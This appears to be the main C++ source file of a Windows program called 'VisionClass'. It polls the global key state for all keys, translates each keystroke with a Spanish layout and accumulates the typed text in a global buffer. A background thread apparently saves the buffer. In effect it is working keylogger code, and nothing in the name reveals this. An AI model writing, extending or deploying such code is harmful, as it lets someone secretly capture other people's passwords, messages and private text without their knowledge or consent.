#include "output.h"
#include "config.h"

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    SetConsoleOutputCP(CP_UTF8);
    std::setlocale(LC_ALL, "es_ES.UTF-8");

    std::wcout << L"VisionClass\n\n";

    HKL layout = LoadKeyboardLayoutA("0000040A", KLF_ACTIVATE);

    std::thread autosave(output::save);
    autosave.detach();

    while (true) {
        for (int key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001);

                if (key == VK_BACK || key == VK_DELETE)
                    continue;

                BYTE keyboardState[256];
                if (!GetKeyboardState(keyboardState))
                    continue;

                if (capsLockOn) keyboardState[VK_CAPITAL] = 0x01;

                WCHAR buffer[5] = { 0 };
                int result = ToUnicodeEx(
                    key,
                    MapVirtualKeyExA(key, MAPVK_VK_TO_VSC, layout),
                    keyboardState,
                    buffer,
                    4,
                    0,
                    layout
                );

                if (result > 0) {
                    std::wcout << buffer;
                    std::wcout.flush();
                    config::g_text += buffer;
                }

                if (key == VK_SPACE) {
                    std::wcout << L" ";
                    config::g_text += L" ";
                }
                else if (key == VK_RETURN) {
                    std::wcout << L"\n";
                    config::g_text += L"\n";
                }
            }
        }

        Sleep(15);
    }

    return 0;
}